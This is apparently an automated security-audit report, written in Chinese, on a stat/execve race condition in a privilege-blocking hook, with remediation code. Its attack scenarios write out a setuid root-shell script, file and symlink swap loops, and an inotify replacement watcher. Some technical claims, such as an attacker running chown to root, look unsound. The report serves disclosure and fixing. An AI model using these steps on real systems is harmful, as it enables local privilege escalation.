# VULN-DF-LPE-002: lpe_exe_check中stat与execve间TOCTOU竞态致权限提升

## 1. 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-DF-LPE-002 |
| **漏洞类型** | TOCTOU 竞态条件 (Time-of-Check to Time-of-Use) |
| **CWE编号** | CWE-367 |
| **严重性** | High |
| **置信度** | 95% |
| **发现来源** | dataflow-module-scanner (lpeblock模块) |

## 2. 漏洞详情

### 2.1 位置信息
- **文件**: `src/om/platform/MindXOM_SDK/src/cpp/lpeblock/lpeblock.c`
- **函数**: `lpe_exe_check()`
- **行号**: 138-155

### 2.2 受影响的系统调用
此漏洞影响:
- `execve()` - 执行程序

### 2.3 代码片段
```c
static int lpe_exe_check(const char* func, const char* path)
{
    struct stat st;
    if (stat(path, &st) != 0) {
        // file not exist
        return E_OK;
    }

    uid_t id = (uid_t)geteuid();
    if (id == 0 && st.st_uid != 0) {
        // process euid is root  but file owner is not
        syslog(LOG_INFO, "LPEBLOCK: uid[%d] process[%s] call[%s] uid[%d] file[%s] blocked",
               id, process_name, func, st.st_uid, path);
        errno = EPERM;
        return E_NOK;
    }
    return E_OK;  // ⚠️ 检查完成后，返回前存在竞态窗口
}

// execve hook
int execve(const char *pathname, char *const argv[], char *const envp[])
{
    if (lpe_exe_check(__FUNCTION__, pathname) != E_OK) {  // 检查
        return -1;
    }
    // ⚠️ RACE WINDOW: 检查完成后，执行前，攻击者可替换文件
    if (libc_execve == NULL) {
        syslog(LOG_INFO, "LPEBLOCK can't find execve");
        return -1;
    }
    return libc_execve(pathname, argv, envp);  // 执行
}
```

### 2.4 数据流
```
pathname -> stat(path, &st) [检查文件所有者]
        -> [⚠️ RACE WINDOW: 攻击者可替换文件]
        -> libc_execve(pathname, argv, envp) [以root权限执行]
```

### 2.5 漏洞根因分析

**设计意图**: LPEBLOCK的设计目的是阻止root进程执行非root用户拥有的可执行文件，防止权限提升攻击。

**漏洞**: 在 `lpe_exe_check()` 检查完成后和 `libc_execve()` 执行之前，存在一个时间窗口。攻击者可以在检查后替换文件内容。

**关键问题**: 
- `stat()` 检查的是文件路径对应的当前文件
- `execve()` 执行时可能已经是不同的文件
- 两次操作使用的是同一个路径字符串，而非文件描述符

## 3. 利用条件分析

### 3.1 攻击者前置条件
| 条件 | 要求 | 说明 |
|------|------|------|
| **可执行文件目录写权限** | 需要能替换目标可执行文件 | 攻击者需要能修改将被执行的文件 |
| **触发root进程执行** | 需要root进程执行特定路径的程序 | 通过合法服务调用或API触发 |
| **竞态成功** | 需在stat和execve之间完成替换 | 窗口更小，但可利用 |

### 3.2 竞态窗口大小
- **典型窗口**: 约1-50微秒 (stat检查 → libc_execve执行)
- **挑战**: 比chmod/chown的窗口更小，因为检查和执行在同一函数内
- **优化条件**: 高系统负载可增加成功率

### 3.3 攻击难度
- **难度**: Medium-High (比VULN-DF-LPE-003更难利用)
- **原因**: 窗口较小，需要精确的时机控制

## 4. 攻击场景描述

### 4.1 场景1: 可执行文件替换攻击

**攻击目标**: 让root进程执行攻击者的恶意代码

**攻击前提**: 
- 存在root进程会执行特定路径的程序
- 该路径所在的目录攻击者有写权限(或攻击者控制该文件)

**攻击步骤**:
1. 攻击者准备恶意可执行文件:
   ```bash
   cat > /tmp/evil_script.sh << 'EOF'
   #!/bin/bash
   # 以root权限执行的恶意代码
   cp /bin/bash /tmp/root_shell
   chmod 4755 /tmp/root_shell
   EOF
   chmod +x /tmp/evil_script.sh
   ```

2. 创建原始合法文件(所有者为root):
   ```bash
   echo "#!/bin/bash" > /target/path/script.sh
   chmod +x /target/path/script.sh
   chown root:root /target/path/script.sh
   ```

3. 监控root进程的执行触发:
   ```bash
   # 攻击者监控文件访问
   while true; do
       # 检测到stat调用后立即替换
       if [ trigger_detected ]; then
           mv /target/path/script.sh /target/path/script.sh.bak
           cp /tmp/evil_script.sh /target/path/script.sh
           # 保留所有者信息以通过检查(如果有)
           chown root:root /target/path/script.sh
       fi
   done
   ```

4. Root进程执行流程:
   - `stat()` 检查 → 文件所有者是root → 检查通过
   - **竞态窗口**: 文件被替换为恶意内容
   - `execve()` 执行 → **恶意代码以root权限运行**

5. 攻击者获得root shell

### 4.2 场景2: 符号链接攻击

**攻击目标**: 利用符号链接绕过检查

**攻击步骤**:
1. 创建符号链接指向root拥有的文件:
   ```bash
   ln -s /bin/ls /tmp/target_link  # /bin/ls 所有者为root
   ```

2. Root进程执行 `/tmp/target_link`
   - `stat()` 检查 → 目标(/bin/ls)所有者为root → 通过
   - 竞态窗口: 替换符号链接
   ```bash
   rm /tmp/target_link
   ln -s /tmp/evil_script /tmp/target_link
   ```
   - `execve()` 执行 → **恶意脚本被执行**

### 4.3 场景3: 持久化利用

攻击者可部署inotify监控:
```python
import inotify_simple
import os
import shutil

def monitor_and_replace(target_path, evil_path):
    inotify = inotify_simple.INotify()
    watch = inotify.add_watch(target_path, inotify_simple.flags.ACCESS)
    
    while True:
        for event in inotify.read():
            if event.mask & inotify_simple.flags.ACCESS:
                # 检测到访问，立即替换内容(保持相同inode)
                shutil.copy(evil_path, target_path)
```

## 5. 潜在影响评估

### 5.1 直接影响
| 影响 | 严重性 | 描述 |
|------|--------|------|
| **本地权限提升** | Critical | Root进程执行攻击者代码 |
| **代码执行** | Critical | 恶意代码以最高权限运行 |
| **系统完全控制** | Critical | 攻击者获得root shell |

### 5.2 间接影响
- **持久化后门**: 安装隐蔽的root级别后门
- **数据泄露**: 访问所有系统数据
- **横向移动**: 在集群内进行横向攻击

### 5.3 与VULN-DF-LPE-003的比较
| 对比项 | VULN-DF-LPE-002 | VULN-DF-LPE-003 |
|--------|-----------------|-----------------|
| 竞态窗口 | 更小(~1-50μs) | 较大(~10-100μs) |
| 利用难度 | Medium-High | Medium |
| 检查次数 | 单次(stat) | 双次(lstat+stat) |
| 潜在影响 | 代码执行 | 权限修改 |

## 6. 修复建议

### 6.1 推荐修复方案: 使用open+fexecve

```c
int execve(const char *pathname, char *const argv[], char *const envp[])
{
    // 使用O_PATH打开文件，获取文件描述符
    int fd = open(pathname, O_PATH | O_CLOEXEC);
    if (fd < 0) {
        syslog(LOG_INFO, "LPEBLOCK: open failed");
        return -1;
    }

    // 使用fstat检查文件描述符对应的文件
    struct stat st;
    if (fstat(fd, &st) != 0) {
        close(fd);
        syslog(LOG_INFO, "LPEBLOCK: fstat failed");
        return -1;
    }

    uid_t id = (uid_t)geteuid();
    if (id == 0 && st.st_uid != 0) {
        close(fd);
        syslog(LOG_INFO, "LPEBLOCK: uid[%d] file owner[%d] blocked", id, st.st_uid);
        errno = EPERM;
        return -1;
    }

    if (libc_execve == NULL) {
        close(fd);
        syslog(LOG_INFO, "LPEBLOCK can't find execve");
        return -1;
    }

    // 使用fexecve执行，操作的是已打开的文件描述符，无竞态风险
    int ret = fexecve(fd, argv, envp);
    // fexecve成功时不会返回，失败时返回-1
    close(fd);
    return ret;
}
```

**关键改进**:
- `open()` 获取文件描述符
- `fstat()` 检查已打开的文件
- `fexecve()` 执行已打开的文件(不是路径)
- 整个过程操作同一个文件描述符，不存在竞态窗口

### 6.2 替代方案: 在检查函数内执行

```c
static int lpe_exe_check_and_exec(const char* path, char *const argv[], char *const envp[])
{
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        return -1;
    }

    struct stat st;
    if (fstat(fd, &st) != 0) {
        close(fd);
        return -1;
    }

    uid_t id = (uid_t)geteuid();
    if (id == 0 && st.st_uid != 0) {
        close(fd);
        errno = EPERM;
        return -1;
    }

    // 直接在这里执行，不返回给调用者
    return fexecve(fd, argv, envp);
}
```

### 6.3 修复优先级
- **High**: 应尽快修复，此漏洞可导致root权限代码执行

## 7. 注意事项

### 7.1 fexecve兼容性
- `fexecve()` 是POSIX.1-2008标准
- 需要内核支持 (Linux 2.3.2+，glibc 2.3.2+)
- MindCluster应支持此功能

### 7.2 O_PATH注意事项
- `O_PATH` 允许获取文件描述符但不实际打开文件内容
- 配合 `fexecve()` 使用可以安全执行
- 比传统 `open(O_RDONLY)` + `fstat()` + `execve()` 更安全

## 8. 参考资料

- [CWE-367: Time-of-check Time-of-Use (TOCTOU) Race Condition](https://cwe.mitre.org/data/definitions/367.html)
- [fexecve(3) - Linux man page](https://man7.org/linux/man-pages/man3/fexecve.3.html)
- [Safe File Operations in Linux](https://lwn.net/Articles/590114/)